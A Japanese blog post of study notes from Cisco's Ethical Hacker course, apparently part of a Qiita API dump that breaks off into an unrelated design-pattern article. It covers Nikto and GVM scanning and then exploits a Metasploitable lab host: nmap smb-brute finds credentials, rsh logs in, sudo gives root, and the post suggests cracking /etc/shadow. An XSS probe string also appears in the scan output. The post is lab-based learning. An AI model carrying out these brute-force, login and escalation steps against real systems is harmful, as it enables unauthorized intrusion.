Design\n1. Authentication Failures\n1. Software or Data Integrity Failures\n1. Logging and Alerting Failures\n1. Mishandling of Exceptional Conditions\n\n## 実践演習：ウェブサイトの脆弱性スキャン\nNiktoというXSSなどの脆弱性を検知できるウェブスキャナーを利用して\nスキャン方法と読み解き方を学習します。\n\n### :one: Niktoの起動とテストサイトのスキャン\nアプリメニューまたはコマンドラインからNiktoを起動しNmap公開テストサイトに対してスキャンを実行します。\n※全件完了には時間を要すため中断してます。\n\nNmap公開テストサイト（scanme.nmap.org）のスクリーンショット\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/3621db1d-6687-468a-bb93-168df2cd7962.png)\n\n\n```shell-session\n┌──(kali㉿Kali)-[~]\n└─$ nikto -h scanme.nmap.org\n- Nikto v2.5.0\n---------------------------------------------------------------------------\n+ Multiple IPs found: 45.33.32.156, 2600:3c01::f03c:91ff:fe18:bb2f\n+ Target IP:          45.33.32.156\n+ Target Hostname:    scanme.nmap.org\n+ Target Port:        80\n+ Start Time:         2025-11-08 12:13:25 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.4.7 (Ubuntu)\n+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/\n+ No CGI Directories found (use '-C all' to force check all possible dirs)\n+ /index: Uncommon header 'tcn' found, with contents: list.\n+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275\n+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.\n+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .\n^C\n```\n\n検出された脆弱性を一つ取り上げると、「X-Content-Type-Optionsヘッダー未設定」と確認できる。\nブラウザがMIMEタイプを誤認し悪用されるリスクがある脆弱性です。\n対策としてContent-Typeを適切に設定するか、「X-Content-Type-Options: nosniff」とスニッフィングを無効化する方法があります。\n\n### :two: 複数サーバーの一括スキャン\nローカル環境の仮想ネットワーク上の複数ホストを一括でスキャンします。\n複数ホストを一括スキャンする際には、対象をリスト化したテキストファイルを用意（DNS Lookupなどを活用）し'-h'オプションでNiktoに渡すことで一括スキャンが可能です。\n\nログが膨大であるためスクリーンショットで代用してます。\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/be1a606e-55b8-44a6-8273-c4d9b41e9bc4.png)\n\n### :three: CVEの確認と詳細調査\n172.17.0.2のローカルWebサーバーをスキャンしたところ、\nCVE-1999-0678とCVE-2003-1418の脆弱性が確認できたためその詳細を確認する。\n\n<details><summary> 実行時のログはこちら（クリックで展開）</summary>\n\n```shell-session\n---------------------------------------------------------------------------\n+ Target IP:          172.17.0.2\n+ Target Hostname:    172.17.0.2\n+ Target Port:        80\n+ Start Time:         2025-11-08 12:26:51 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.8 (Ubuntu) DAV/2\n+ /: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.\n+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/\n+ /index: Uncommon header 'tcn' found, with contents: list.\n+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275\n+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.\n+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.\n+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing\n+ /phpinfo.php: Output from the phpinfo() function was found.\n+ /doc/: Directory indexing found.\n+ /doc/: The /doc/ directory is browsable. This may be /usr/doc. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0678\n+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /phpMyAdmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /phpMyAdmin/ChangeLog: Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 1115138, size: 40540, mtime: Tue Dec  9 17:24:00 2008. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418\n+ /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /test/: Directory indexing found.\n+ /test/: This might be interesting.\n+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552\n+ /icons/: Directory indexing found.\n+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/\n+ /phpMyAdmin/: phpMyAdmin directory found.\n+ /phpMyAdmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /phpMyAdmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. See: https://typo3.org/\n+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.\n+ 8917 requests: 0 error(s) and 27 item(s) reported on remote host\n+ End Time:           2025-11-08 12:27:10 (GMT0) (19 seconds)\n\n```\n\n</details>\n\nNIST NVD（https://nvd.nist.gov/) から詳細を確認すると\n* CVE-1999-0678\nApache のデフォルト設定により /usr/doc が公開され、サーバー内部ドキュメントが閲覧可能となる問題\n* CVE-2003-1418\nETag に含まれる inode や、multipart MIME 境界の子プロセス ID が漏洩しうる問題\n\nであることがわかります。\n\n参考：CVEに関するスクリーンショット\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/d3a91e01-42ea-4597-b234-11c97fc1da12.png)\n\n### :four: Niktoの実行結果のエクスポート\nNiktoはスキャン結果を HTML / CSV / TXT 形式で出力可能です。\nhtml と csv 形式で出力する方法をそれぞれ示します。\n* html\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/a1ab2f15-eb8e-420f-aa52-e289e166d84c.png)\n\n<details><summary>実行時のログはこちら（クリックで展開）</summary>\n\n```shell-session\n┌──(kali㉿Kali)-[~]\n└─$ nikto -h 172.17.0.2 -o scan_results.htm\n- Nikto v2.5.0\n---------------------------------------------------------------------------\n+ Target IP:          172.17.0.2\n+ Target Hostname:    172.17.0.2\n+ Target Port:        80\n+ Start Time:         2025-11-08 12:42:36 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.8 (Ubuntu) DAV/2\n+ /: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.\n+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/\n+ /index: Uncommon header 'tcn' found, with contents: list.\n+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275\n+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.\n+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.\n+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing\n+ /phpinfo.php: Output from the phpinfo() function was found.\n+ /doc/: Directory indexing found.\n+ /doc/: The /doc/ directory is browsable. This may be /usr/doc. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0678\n+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /phpMyAdmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /phpMyAdmin/ChangeLog: Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 1115138, size: 40540, mtime: Tue Dec  9 17:24:00 2008. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418\n+ /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /test/: Directory indexing found.\n+ /test/: This might be interesting.\n+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552\n+ /icons/: Directory indexing found.\n+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/\n+ /phpMyAdmin/: phpMyAdmin directory found.\n+ /phpMyAdmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /phpMyAdmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. See: https://typo3.org/\n+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.\n+ 8910 requests: 0 error(s) and 27 item(s) reported on remote host\n+ End Time:           2025-11-08 12:42:54 (GMT0) (18 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested\n```\n\n</details>\n\n* csv\n\n```bash\n┌──(kali㉿Kali)-[~]\n└─$ cat scan_results.txt                                                                                                                       \n\"Nikto - v2.5.0/\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"\",\"\",\"\",\"Apache/2.2.8 (Ubuntu) DAV/2\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"\",\"GET\",\"/\",\"Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\",\"GET\",\"/\",\"The anti-clickjacking X-Frame-Options header is not present.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/\",\"GET\",\"/\",\"The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"\",\"GET\",\"/index\",\"Uncommon header 'tcn' found, with contents: list.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275\",\"GET\",\"/index\",\"Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"\",\"HEAD\",\"/\",\"Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"\",\"ARPIYMWU\",\"/\",\"Web Server returns a valid response with junk HTTP methods which may cause false positives.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"https://owasp.org/www-community/attacks/Cross_Site_Tracing\",\"TRACE\",\"/\",\"HTTP TRACE method is active which suggests the host is vulnerable to XST.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"\",\"GET\",\"/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>\",\"/phpinfo.php: Output from the phpinfo() function was found.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"\",\"GET\",\"/doc/\",\"Directory indexing found.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"CVE-1999-0678\",\"GET\",\"/doc/\",\"The /doc/ directory is browsable. This may be /usr/doc.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"OSVDB-12184\",\"GET\",\"/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000\",\"PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"OSVDB-12184\",\"GET\",\"/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42\",\"PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"OSVDB-12184\",\"GET\",\"/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42\",\"PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"OSVDB-12184\",\"GET\",\"/?=PHPE9568F35-D428-11d2-A769-00AA001ACF42\",\"PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"\",\"GET\",\"/phpMyAdmin/changelog.php\",\"phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"CVE-2003-1418\",\"GET\",\"/phpMyAdmin/ChangeLog\",\"Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 1115138, size: 40540, mtime: Tue Dec  9 17:24:00 2008.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"\",\"GET\",\"/phpMyAdmin/ChangeLog\",\"phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"\",\"GET\",\"/test/\",\"Directory indexing found.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"\",\"GET\",\"/test/\",\"This might be interesting.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"CWE-552\",\"GET\",\"/phpinfo.php\",\"PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"\",\"GET\",\"/icons/\",\"Directory indexing found.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/\",\"GET\",\"/icons/README\",\"Apache default file found.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"\",\"GET\",\"/phpMyAdmin/\",\"phpMyAdmin directory found.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"\",\"GET\",\"/phpMyAdmin/Documentation.html\",\"phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"https://typo3.org/\",\"GET\",\"/phpMyAdmin/README\",\"phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\"\n\"172.17.0.2\",\"172.17.0.2\",\"80\",\"\",\"GET\",\"/#wp-config.php#\",\"#wp-config.php# file found. This file contains the credentials.\"\n```\n\n<details><summary>実行時のログはこちら（クリックで展開）</summary>\n\n```shell-session\n┌──(kali㉿Kali)-[~]\n└─$ nikto -h 172.17.0.2 -o scan_results.txt -Format csv\n- Nikto v2.5.0\n---------------------------------------------------------------------------\n+ Target IP:          172.17.0.2\n+ Target Hostname:    172.17.0.2\n+ Target Port:        80\n+ Start Time:         2025-11-08 12:43:12 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.8 (Ubuntu) DAV/2\n+ /: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.\n+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/\n+ /index: Uncommon header 'tcn' found, with contents: list.\n+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275\n+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.\n+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.\n+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing\n+ /phpinfo.php: Output from the phpinfo() function was found.\n+ /doc/: Directory indexing found.\n+ /doc/: The /doc/ directory is browsable. This may be /usr/doc. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0678\n+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /phpMyAdmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /phpMyAdmin/ChangeLog: Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 1115138, size: 40540, mtime: Tue Dec  9 17:24:00 2008. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418\n+ /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /test/: Directory indexing found.\n+ /test/: This might be interesting.\n+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552\n+ /icons/: Directory indexing found.\n+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/\n+ /phpMyAdmin/: phpMyAdmin directory found.\n+ /phpMyAdmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /phpMyAdmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. See: https://typo3.org/\n+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.\n+ 8910 requests: 0 error(s) and 27 item(s) reported on remote host\n+ End Time:           2025-11-08 12:43:28 (GMT0) (16 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested\n```\n\n</details>\n\n### 参考：Nikto以外の脆弱性スキャナー\n* 商用向け（有償）\n    * nvicti / Netsparker (invicti)\n    * Acunetix\n* オープンソース\n    * OWASP ZAP\n    * w3af\n* 特化ツール\n    * sqlmap：sqlに特化\n    * WPScan：WordPressに特化\n\n## 実践演習：GVM脆弱性スキャナの利用\n本演習では脆弱なホスト（172.17.0.2）に対して、\n脆弱性スキャンを実行し、発見された脆弱性を悪用します。\n\nGVMのスキャン実行手順については以前扱ってますのでそちらをご覧ください。\n\nhttps://qiita.com/dabide/items/67ac8910e7667751514d#-%E5%AE%9F%E8%B7%B5%E6%BC%94%E7%BF%92greenbone-vulnerability-managementgvm%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%9F%E8%84%86%E5%BC%B1%E6%80%A7%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\n\n### :one: GVMでのスキャン実行\n脆弱なホストに対して詳細タスクウィザードを選択し「Metaspoloitable」というタスク名を付けて実行します。\n※スキャンがかなり時間を要し、30分以上かかります。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/3fe254dc-715e-4c37-b2b0-f63ea7bf3873.png)\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/b6d87399-2beb-4eda-b2d9-77705bd2c67b.png)\n\n### :two: スキャン結果の確認\nスキャン完了後にレポートを開きスキャン結果を確認します。\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/c5bf6221-9e47-453e-919c-247c35f33894.png)\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/34b29f2b-7117-45f3-971c-b8ef7596d187.png)\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/c2de7f29-1a0f-4233-bbac-b9834e27fbcc.png)\n\n複数の脆弱性の内、「rexecサービスが実行中」という脆弱性について悪用します。\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/36a62c03-f255-45e3-8d89-c2c111916342.png)\n\n#### 参考\n対策やCVSSのスコア、脆弱性テストのスクリプトを含む脆弱性の詳細については、レポート内の脆弱性詳細のSolution や CVE の詳細ページを閲覧することで確認できます。\n一つ前のスクリーンショットのSolutionの項から、rexecサービスの代わりにSSHを利用するのが対策の一つとして挙げられてます。\n\n### :three: 発見した脆弱性を悪用する。\nNmapを利用し、rexecが使用できるアカウント情報をSMBから情報が得られるかを確認します。\n※SMBの脆弱性確認は省略してます。\n\nOSのユーザー名とSMBのユーザー名を同期させることが多い点を考慮して、\nNmap NSEスクリプトのうち'smb-burte'を利用してアカウントを調査します。\n```shell-session\n┌──(kali㉿Kali)-[~]\n└─$ sudo nmap -sV -p 445 -script smb-brute 172.17.0.2\nStarting Nmap 7.94 ( https://nmap.org ) at 2025-11-08 13:59 UTC\nNmap scan report for metasploitable.vm (172.17.0.2)\nHost is up (0.000033s latency).\n\nPORT    STATE SERVICE     VERSION\n445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\nMAC Address: 02:42:AC:11:00:02 (Unknown)\n\nHost script results:\n| smb-brute: \n|   msfadmin:msfadmin => Valid credentials\n|_  user:user => Valid credentials\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 241.04 seconds\n```\n\nHost script resultsから2つのユーザーとパスワードが確認できます。\nこれらを用いてrexecサービス（rsh）を実行します。\n\n```shell-session\n┌──(kali㉿Kali)-[~]\n└─$ rsh -l msfadmin 172.17.0.2                                                                         \nLast login: Sun Jul 16 21:04:01 EDT 2017 on tty1\nLinux 32554753bfe5 4.13.0-21-generic #24-Ubuntu SMP Mon Dec 18 17:29:16 UTC 2017 x86_64\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nTo access official Ubuntu documentation, please visit:\nhttp://help.ubuntu.com/\nNo mail.\nmsfadmin@metasploitable:~$ pwd     \n/home/msfadmin\nmsfadmin@metasploitable:~$ sudo su\n[sudo] password for msfadmin: \nroot@metasploitable:/home/msfadmin# \n```\n\n特権ユーザへの昇格まで成功しています。\nこの後 /etc/passwd および /etc/shadow ファイルをコピーしJohn the Ripperユーティリティなどを用いてパスワード解析することで、次の攻撃へと連鎖すること容易に想像できると思います。\n※パスワードクラックに関しては6.5章「認証ベースの脆弱性の悪用」で扱います。\n\n---\n\n## 6.2. 独自のWebアプリラボの構築方法\n\n### ● ラボ環境の目的\n\n* Webアプリ脆弱性を安全に理解・検証\n* インジェクションや認証欠陥を実習可能\n\n### ● おすすめのLinuxディストリビューション\n下記を利用した環境構築が手軽でおすすめです。\n\n[Kali Linux](https://www.kali.org)：本記事でも利用している最も人気なディストリビューション\n[Parrot OS](https://www.parrotsec.org)：ペンテスターや研究者に人気なディストリビューション\n[BlackArch Linux](https://blackarch.org)：1900以上のツールパッケージが付属するディストリビューション\n\n---\n\n## 6.3 ビジネスロジックの欠陥の理解\n\nビジネスロジックの欠陥とは設計上の欠陥のこと。\n脆弱性スキャナでは検知ができないため独自の対策が必要です。\n\n* 例: 課金ロジックやポイント加算の不正操作\n* 対策: 入力検証と処理フローの厳格化\n* OWASPが推奨する欠陥に対する攻撃テスト及び防御方法は[こちら](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation)\n\n---\n\n## 本章のまとめ\n\n本章ではWebアプリケーションの脆弱性を体系的に整理し、**HTTP/HTTPSプロトコル理解 → OWASP Top 10 → ラボ環境での演習 → 独自のWebアプリラボの構築方法 → ビジネスロジックの欠陥の理解**までを扱いました。\n\n* セッション管理や認証処理の欠陥、入力検証の不備が攻撃成立に直結する\n* OWASP Top 10を理解し、防御策を検討することがセキュリティ専門家の基本\n\n---\n\n📍 **次回予告**\n次回は「6.4 インジェクション攻撃」以降の6章の内容を解説します。\n\n---\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T14:31:15+09:00",
      "group": null,
      "id": "148525e3c0582dfaa097",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "Security",
          "versions": []
        },
        {
          "name": "Cisco",
          "versions": []
        },
        {
          "name": "Hacking",
          "versions": []
        }
      ],
      "title": "CiscoオンラインコースであるEthical Hacker（倫理的ハッカー）で学んだ内容をまとめてみた（第8回）",
      "updated_at": "2025-12-09T15:04:08+09:00",
      "url": "https://qiita.com/dabide/items/148525e3c0582dfaa097",
      "user": {
        "description": null,
        "facebook_id": null,
        "followees_count": 1,
        "followers_count": 0,
        "github_login_name": null,
        "id": "dabide",
        "items_count": 9,
        "linkedin_id": null,
        "location": null,
        "name": "",
        "organization": null,
        "permanent_id": 4177943,
        "profile_image_url": "https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/profile-images/1756878186",
        "team_only": false,
        "twitter_screen_name": "dabi_dabide",
        "website_url": null
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<blockquote data-sourcepos=\"1:1-3:187\">\n<p data-sourcepos=\"1:3-1:10\"><strong>Note</strong></p>\n<ul data-sourcepos=\"2:3-3:187\">\n<li data-sourcepos=\"2:3-2:85\">私は韓国でプログラミングと日本語を勉強している学生です</li>\n<li data-sourcepos=\"3:3-3:187\">日本語がまだ不慣れなため、翻訳には機械翻訳を使用しました。もし不自然な点や間違いがありましたら、ご指摘いただけると幸いです</li>\n</ul>\n</blockquote>\n<h2 data-sourcepos=\"6:1-6:54\">\n<span id=\"ファクトリーメソッドパターンの限界\" class=\"fragment\"></span><a href=\"#%E3%83%95%E3%82%A1%E3%82%AF%E3%83%88%E3%83%AA%E3%83%BC%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89%E3%83%91%E3%82%BF%E3%83%BC%E3%83%B3%E3%81%AE%E9%99%90%E7%95%8C\"><i class=\"fa fa-link\"></i></a>ファクトリーメソッドパターンの限界</h2>\n<p data-sourcepos=\"8:1-8:53\"><iframe id=\"qiita-embed-content__592200f7b328cdef01bbcbe16f40468d\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__592200f7b328cdef01bbcbe16f40468d\" data-content=\"https%3A%2F%2Fqiita.com%2Fharoya01%2Fitems%2F25ff80f58021b6ad69a7\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"10:1-10:196\">前回の記事でファクトリーメソッドパターンについて整理した際、「誰」が <code>new</code> を通じてオブジェクトを生成するのかという問題がありました。</p>\n<p data-sourcepos=\"12:1-12:36\">前回の内容を振り返ると、</p>\n<ul data-sourcepos=\"14:1-14:83\">\n<li data-sourcepos=\"14:1-14:83\">結局、結合が移動しただけであり、解決されたわけではない</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"15:1-18:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// どこかで結局呼び出される</span>\n<span class=\"n\">map</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"サーモン\"</span><span class=\"o\">,</span> <span class=\"k\">new</span> <span class=\"nc\">SalmonRestaurant</span><span class=\"o\">());</span>\n</code></pre></div></div>\n<p data-sourcepos=\"19:1-19:208\">新しいメニューが追加されると、結局、開発者が 